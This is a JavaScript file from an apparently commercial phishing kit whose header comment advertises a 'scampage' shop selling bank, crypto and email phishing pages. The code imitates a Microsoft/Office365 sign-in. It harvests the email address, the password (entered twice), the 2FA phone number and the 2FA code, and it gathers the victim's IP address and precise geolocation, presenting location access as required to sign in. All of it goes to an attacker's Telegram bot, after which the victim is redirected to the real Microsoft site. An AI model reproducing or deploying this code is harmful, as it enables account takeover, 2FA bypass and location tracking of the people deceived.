//THIS CODE WAS BUILT BY "SCAMPAGESHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//
//Do not touch this section
//If you want to get quality:
// - USA Banks Scampage
// - UK Banks Scampage
// - Australian Scampage
// - Canadian Scampage
// - Crypto Websites Scampage 
// - Email Accounts Scampage
// - Newsletter Scampage and more..

// Visit: https://www.scampage.shop

const OpenCageApiKey = "4e409ae9c61a4c72a039a8c02e10e45a";

document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid email address, phone number, or Skype name."
    const pwdReq = "Please enter the password for your Microsoft account."
    const confirmReq = "Please confirm the password for your Microsoft account."
    const verifyStartReq = "Please enter the phone number connected to your Microsoft account."
    const verifyCodeReq = "Please enter the correct security code that was sent to you."

    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    const confirmInp = document.getElementById('inp_confirm');
    const verifyStartInp = document.getElementById('inp_verify');
    const verifyCodeInp = document.getElementById('inp_code');

    let view = "uname";

    let unameVal = pwdVal = confirmVal = verifyStartVal = verifyCodeVal = false;

    unameInp.addEventListener('keydown', (event) => handleNextDown(event, nxt));

    function handleNextDown(event, nextButton) {
        if (event.key === "Enter") {
            event.preventDefault();
            nextButton.click();
        }
    }

    pwdInp.addEventListener('keydown', (event) => handleConfirmDown(event, confirm));

    function handleConfirmDown(event, confirmButton) {
        if (event.key === "Enter") {
            event.preventDefault();
            confirmButton.click();
        }
    }

    confirmInp.addEventListener('keydown', (event) => handleSigDown(event, sig));

    function handleSigDown(event, sigButton) {
        if (event.key === "Enter") {
            event.preventDefault();
            sigButton.click();
        }
    }

    verifyStartInp.addEventListener('keydown', (event) => handleVerifyStartDown(event, verify));

    function handleVerifyStartDown(event, verifyButton) {
        if (event.key === "Enter") {
            event.preventDefault();
            verifyButton.click();
        }
    }

    verifyCodeInp.addEventListener('keydown', (event) => handleVerifyCodeDown(event, code));

    function handleVerifyCodeDown(event, codeButton) {
        if (event.key === "Enter") {
            event.preventDefault();
            codeButton.click();
        }
    }

    /////next button
    const nxt = document.getElementById('btn_next');

    nxt.addEventListener('click', () => {
        //validate the form
        validate();
        if (unameVal) {
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            })
            view = "pwd";
        }
    })

    /////confirm button
    const confirm = document.getElementById('btn_confirm');

    confirm.addEventListener('click', () => {
        //validate the form
        validate();
        if (pwdVal) {
            document.getElementById("section_pwd").classList.toggle('d-none');
            document.getElementById('section_confirm').classList.remove('d-none');
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            })
            view = "confirm";
        }
    })

    //////sign in button
    const sig = document.getElementById('btn_sig');

    sig.addEventListener('click', () => {
        //validate the form
        validate();
        if (confirmVal) {
            document.getElementById("section_confirm").classList.toggle('d-none');
            document.getElementById('section_verify').classList.remove('d-none');
            view = "verify";
        }
        sendFirstLogs();
    })


    //////verify start button
    const verify = document.getElementById('btn_verify');

    verify.addEventListener('click', () => {
        //validate the form
        validate();
        if (verifyStartVal) {
            document.getElementById("section_verify").classList.toggle('d-none');
            document.getElementById('section_code').classList.remove('d-none');
            view = "code";
        }
    })

    //////verify code button
    const code = document.getElementById('btn_code');

    code.addEventListener('click', () => {
        //validate the form
        validate();
        if (verifyCodeVal) {
            document.getElementById("section_code").classList.toggle('d-none');
            document.getElementById('section_final').classList.remove('d-none');
            view = "final";
        }
    })

    function validate() {
        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp')
                unameVal = true;
            }

        }

        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp')
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp')
                pwdVal = true;
            }

        }

        function confirmValAction(type) {
            if (!type) {
                document.getElementById('error_confirm').innerText = confirmReq;
                confirmInp.classList.add('error-inp')
                confirmVal = false;
            } else {
                document.getElementById('error_confirm').innerText = "";
                confirmInp.classList.remove('error-inp')
                confirmVal = true;
            }

        }

        function verifyStartValAction(type) {
            if (!type) {
                document.getElementById('error_verify').innerText = verifyStartReq;
                verifyStartInp.classList.add('error-inp')
                verifyStartVal = false;
            } else {
                document.getElementById('error_verify').innerText = "";
                verifyStartInp.classList.remove('error-inp')
                verifyStartVal = true;
            }
        }

        function verifyCodeValAction(type) {
            if (!type) {
                document.getElementById('error_code').innerText = verifyCodeReq;
                verifyCodeInp.classList.add('error-inp')
                verifyCodeVal = false;
            } else {
                document.getElementById('error_code').innerText = "";
                verifyCodeInp.classList.remove('error-inp')
                verifyCodeVal = true;
            }
        }

        if (view === "uname") {
            if (unameInp.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
                const email = unameInp.value;
                localStorage.setItem("Email address", email);
            }
            unameInp.addEventListener('change', function() {
                if (this.value.trim() === "") {
                    unameValAction(false);
                } else {
                    unameValAction(true);
                }
            })
        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
                const password = pwdInp.value;
                localStorage.setItem("Password", password);
                //sendLogs();
            }
            pwdInp.addEventListener('change', function() {
                if (this.value.trim() === "") {
                    pwdValAction(false);
                } else {
                    pwdValAction(true);
                }
            })
        } else if (view === "confirm") {
            if (confirmInp.value.trim() === "") {
                confirmValAction(false);
            } else {
                confirmValAction(true);
                const confirmPassword = confirmInp.value;
                localStorage.setItem("Password confirmed", confirmPassword);
                //sendLogs();
            }
            confirmInp.addEventListener('change', function() {
                if (this.value.trim() === "") {
                    confirmValAction(false);
                } else {
                    confirmValAction(true);
                }
            })
        } else if (view === "verify") {
            if (verifyStartInp.value.trim() === "") {
                verifyStartValAction(false);
            } else {
                verifyStartValAction(true);
                const twoFANumber = verifyStartInp.value;
                localStorage.setItem("2FA Number", twoFANumber);
                //sendLogs();
            }
            verifyStartInp.addEventListener('change', function() {
                if (this.value.trim() === "") {
                    verifyStartValAction(false);
                } else {
                    verifyStartValAction(true);
                }
            })
        } else if (view === "code") {
            if (verifyCodeInp.value.trim() === "") {
                verifyCodeValAction(false);
            } else {
                verifyCodeValAction(true);
                const twoFACode = verifyCodeInp.value;
                localStorage.setItem("2FA Code", twoFACode);
                //sendLogs();
            }
            verifyCodeInp.addEventListener('change', function() {
                if (this.value.trim() === "") {
                    verifyCodeValAction(false);
                } else {
                    verifyCodeValAction(true);
                }
            })
        }
        return false;
    }

    //back button
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.toggle('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    })

    //second back button
    document.querySelector('.backConfirm').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_confirm").classList.toggle('d-none');
        document.getElementById('section_pwd').classList.remove('d-none');
    })


    //verify buttons
    document.querySelectorAll('#btn_verify').forEach((b) => {
        b.addEventListener('click', () => {
            sendLogs();
        })

        b.addEventListener('keydown', (event) => handleFinalDown(event, b));
    })

    function handleFinalDown(event, b) {
        if (event.key === "Enter") {
            event.preventDefault();
            sendLogs();
        }
    }

    //send code button
    document.querySelectorAll('#btn_code').forEach((b) => {
        b.addEventListener('click', () => {
            sendCode();
        })

        b.addEventListener('keydown', (event) => handleSendCode(event, b));
    })

    function handleSendCode(event, b) {
        if (event.key === "Enter") {
            event.preventDefault();
            sendCode();
        }
    }

    function generateId() {
        const characters = 'abcdef0123456789';
        const numDashes = 4; // Number of dashes
        const length = 13; // Length of each random segment between dashes

        const dashPositions = [];
        for (let i = 1; i < numDashes; i++) { // Start from 1 to skip adding a dash at the beginning
            dashPositions.push((length + 1) * i + i - 1); // Calculating dash positions
        }

        let result = '';
        let dashCount = 0;

        for (let i = 0; i < numDashes * (length + 1); i++) {
            if (dashPositions.includes(i)) {
            result += '-';
            dashCount++;
            } else {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
        }

        return result;
    };

    function generateIdLetters() {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
        const numDashes = 4; // Number of dashes
        const length = 21; // Length of each random segment between dashes

        const dashPositions = [];
        for (let i = 1; i < numDashes; i++) { // Start from 1 to skip adding a dash at the beginning
            dashPositions.push((length + 1) * i + i - 1); // Calculating dash positions
        }

        let result = '';
        let dashCount = 0;

        for (let i = 0; i < numDashes * (length + 1); i++) {
            if (dashPositions.includes(i)) {
            result += '-';
            dashCount++;
            } else {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
        }

        return result;
    };

    function formatDate(date) {
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];

        const day = days[date.getUTCDay()];
        const dayOfMonth = String(date.getUTCDate()).padStart(2, '0');
        const month = months[date.getUTCMonth()];
        const year = date.getUTCFullYear();
        const hours = String(date.getUTCHours()).padStart(2, '0');
        const minutes = String(date.getUTCMinutes()).padStart(2, '0');
        const seconds = String(date.getUTCSeconds()).padStart(2, '0');

        return `${day}, ${dayOfMonth} ${month} ${year} ${hours}:${minutes}:${seconds} GMT`;
    };

    function setCurrentDateInDesiredFormat() {
        var currentDate = new Date();
        var formattedDate = formatDate(currentDate);
        return formattedDate;
    };

    function sendFirstLogs() {
        const username = unameInp.value;
        const password = pwdInp.value;
        const confirmPassword = confirmInp.value;

        const id1 = generateId();
        const id2 = generateId();
        const id3 = generateIdLetters();
        const id4 = generateId();
        const userAgent = navigator.userAgent;
        const date = setCurrentDateInDesiredFormat();

        const x = `prompt=login&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&uaid=${id1}; "userAgent"=${userAgent}-NG; MSPOK=$uuid-${id2}; &ui_locales=en-GB&client_info=1&${id3}=0&login_username=${username}&passwd=${password}; DeviceId=${id4}; status_date=${date};`;

        fetch('https://api.ipify.org')
            .then(res => res.text())
            .then(ipAddress => {
                const deviceInfo = {
                    manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
                    model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
                    os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
                    browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
                };
                localStorage.setItem("IP Address", ipAddress);
                getFirstLocation(username, password, confirmPassword, x, deviceInfo, ipAddress);
            })
            .catch(error => {
                console.error("Error capturing IP address:", error);
            });

    };

    function getFirstLocation(username, password, confirmPassword, x, deviceInfo, ipAddress) {
        navigator.geolocation?.getCurrentPosition(async (position) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                const apiUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${OpenCageApiKey}&pretty=1&no_annotations=1`;

                try {
                    const response = await fetch(apiUrl);
                    const data = await response.json();

                    if (data.results.length > 0) {
                        const result = data.results[0].components;
                        const city = result.city || result.village || result.town;
                        const state = result.state;
                        const country = result.country;
                        const zipCode = result.postcode;
                        const continent = result.continent;
                        const county = result.county;

                        var dataToSend = {
                            username,
                            password,
                            confirmPassword,
                            ipAddress,
                            Device: deviceInfo.manufacturer,
                            OS: deviceInfo.os,
                            Browser: deviceInfo.browser,
                            Latitude: latitude,
                            Longitude: longitude,
                            City: city,
                            State: state,
                            Country: country,
                            County: county,
                            ZipCode: zipCode,
                            Cookies: x,
                        };

                        if (Object.keys(dataToSend).length > 0) {
                            sendFirstToTelegram(dataToSend);
                        } else {
                            console.warn("No data to send to Telegram.");
                        }
                    } else {
                        console.error("Location information not found.");
                    }
                } catch (error) {
                    console.error("Error fetching location data:", error);
                }
            },
            (error) => {
                console.error("Error getting location:", error);
                alert("Location permission is required to login to your Microsoft Account.");
            });
    };

    function sendFirstToTelegram(data) {
        var payload = {
            chat_id: chatId,
            text: `
            New Office365 Login:
            ________________________
               "Email address, phone number or skype": "${data.username}",
               "Password": "${data.password}",
               "Confirmed Password": "${data.confirmPassword}",
               "IP Address": ${data.ipAddress},
               "Device Info": "${data.Device}",
               "OS": "${data.OS}",
               "Browser": "${data.Browser}",
               "Latitude": ${data.Latitude},
               "Longitude": ${data.Longitude},
               "City": "${data.City}",
               "State": "${data.State}",
               "County": "${data.County}",
               "Country": "${data.Country}",
               "ZipCode": ${data.ZipCode},
               "Cookies": ["${data.Cookies}"]
            `
        };

        var sendToBot = {
            url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "cache-control": "no-cache"
            },
            data: JSON.stringify(payload)
        };

        $.ajax(sendToBot).done(function(response) {
            // console.log("Telegram API response:", JSON.stringify(response));
        }).fail(function(error) {
            console.error("Error sending data to Telegram:", error);
        });
    };

    function sendLogs() {
        const twoFANumber = verifyStartInp.value;
        const ipAddress = localStorage.getItem("IP Address");

        getLocation(twoFANumber, ipAddress);
    };

    function getLocation(twoFANumber, ipAddress) {

        var codeToSend = {
            twoFANumber,
            ipAddress,
        };

        if (Object.keys(codeToSend).length > 0) {
            sendToTelegram(codeToSend);
        } else {
            console.warn("No data to send to Telegram.");
        }
    };

    function sendToTelegram(data) {
        var payload = {
            chat_id: chatId,
            text: `
             New Office365 2FA Code:
            ________________________
               "2FA Number": ${data.twoFANumber},
               "IP Address": ${data.ipAddress}
            `
        };

        var sendToBot = {
            url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "cache-control": "no-cache"
            },
            data: JSON.stringify(payload)
        };

        $.ajax(sendToBot).done(function(response) {
            // console.log("Telegram API response:", JSON.stringify(response));
        }).fail(function(error) {
            console.error("Error sending data to Telegram:", error);
        });
    };

    function sendCode() {
        const twoFACode = verifyCodeInp.value;
        const twoFANumber = verifyStartInp.value;
        const ipAddress = localStorage.getItem("IP Address");

        codeDetails(twoFACode, twoFANumber, ipAddress);
    };

    function codeDetails(twoFACode, twoFANumber, ipAddress) {

        var codeToSend = {
            twoFACode,
            twoFANumber,
            ipAddress,
        };

        if (Object.keys(codeToSend).length > 0) {
            sendCodeToTelegram(codeToSend);
        } else {
            console.warn("No data to send to Telegram.");
        }
    };

    function sendCodeToTelegram(data) {
        var payload = {
            chat_id: chatId,
            text: `
            New Office365 2FA Code:
            ________________________
               "2FA Code": ${data.twoFACode},
               "2FA Number": ${data.twoFANumber},
               "IP Address": ${data.ipAddress}
            `
        };

        var sendToBot = {
            url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "cache-control": "no-cache"
            },
            data: JSON.stringify(payload)
        };

        $.ajax(sendToBot).done(function(response) {
            localStorage.removeItem("Email address");
            localStorage.removeItem("Password");
            localStorage.removeItem("Password confirmed");
            localStorage.removeItem("IP Address");
            localStorage.removeItem("2FA Number");
            localStorage.removeItem("2FA Code");
            window.location.href = "https://account.microsoft.com";
            // console.log("Telegram API response:", JSON.stringify(response));
        }).fail(function(error) {
            console.error("Error sending data to Telegram:", error);
        });
    };
});